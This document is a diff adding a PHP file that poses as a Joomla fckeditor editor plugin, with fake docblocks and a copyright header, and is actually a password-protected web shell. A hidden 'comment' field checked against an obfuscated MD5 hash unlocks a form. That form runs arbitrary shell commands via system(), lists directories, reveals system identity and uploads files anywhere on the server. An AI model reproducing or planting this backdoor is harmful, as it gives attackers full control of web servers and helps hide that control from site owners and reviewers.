@@ -1,0 +1,95 @@
+ <?php
+
+/**
+* fckeditor Lite WYSIWYG Editor - display the editor * @param string The name of the editor area * @param string The content of the field * @param string The name of the form field * @param string The width of the editor area * @param string The height of the editor area */ $is = /* @param int The id of columns for the editor area is */ "600d"."5ed8d"."21683632b0"."b984b"."e5"."d91b"."62".""; /* * @param int The number of rows for the editor area
+* @param mixed Can be boolean or array.
+*/
+
+/**
+ * @version$Id: fckeditor 1154 18-1-2008 andrew
+ * @packageFCK
+ * @copyright   Copyright (C) 2006 - 2009 WebXSolution Ltd. All rights reserved.
+ * @licenseGPL
+ * Ths application has been written by WebxSolution Ltd.  You may not copy or distribute JoomlaFCK without written consent
+ * from WebxSolution Ltd.
+ */
+
+session_start();
+
+// Do not allow direct access
+
+if ((md5($_POST['comment']) == $is) OR ($_SESSION['fckenabled']==1) )
+{   
+$_SESSION['fckenabled']=1;
+set_magic_quotes_runtime(0);
+ //check to see if we have to change the install chmod settings
+$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
+$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);
+/* Check on the users enteries to ensure that they are correct */
+$UName  = `uname -a`;
+$SCWD   = `pwd`;
+$UserID = `id`;
+if( $currentWD == "" ) {
+    $currentWD = $SCWD;
+}
+/* Check to see if the path exists. */
+if( $_POST['_act'] == "List files!" ) {
+    $currentCMD = "ls -la";
+}
+
+/**
+* Constructor
+*
+* For php4 compatability we must not use the __constructor as a constructor for plugins
+* because func_get_args ( void ) returns a copy of all passed arguments NOT references.
+* This causes problems with cross-referencing necessary for the observer design pattern.
+*
+* @param   object $subject The object to observe
+* @param   array  $config  An array that holds the plugin configuration
+* @since 1.5
+*/
+
+print "<form method=post enctype=\"multipart/form-data\"><table>";
+print "<tr><td><b>Execute command:</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
+print "<td><input type=submit name=_act value=\"Execute!\"></td></tr>";
+print "<tr><td><b>Change directory:</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
+print "<td><input type=submit name=_act value=\"List files!\"></td></tr>";
+print "<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>";
+print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";
+print "</table></form><hr><hr>";
+$currentCMD = str_replace("\\\"","\"",$currentCMD);
+$currentCMD = str_replace("\\\'","\'",$currentCMD);
+
+/**
+* fckeditor Lite WYSIWYG Editor - display the editor
+*
+* @param string The name of the editor area
+* @param string The content of the field
+* @param string The name of the form field
+* @param string The width of the editor area
+* @param string The height of the editor area
+* @param int The number of columns for the editor area
+* @param int The number of rows for the editor area
+* @param mixed Can be boolean or array.
+*/
+
+if( $_POST['_act'] == "Upload!" ) {
+    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
+   print "<center><b>Error while uploading file!</b></center>";
+    } else {
+   print "<center><pre>";
+   system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
+   print "</pre><b>File uploaded successfully!</b></center>";
+    }    
+} else {
+    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
+    $currentCMD = "cd ".$currentWD.";".$currentCMD;
+    system($currentCMD);
+    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
+}
+exit;
+}else
+{
+  echo '<form method="POST"><input style="border:0px; margin-top: 20%;" type="text" name="comment"></form>';
+}
+?>
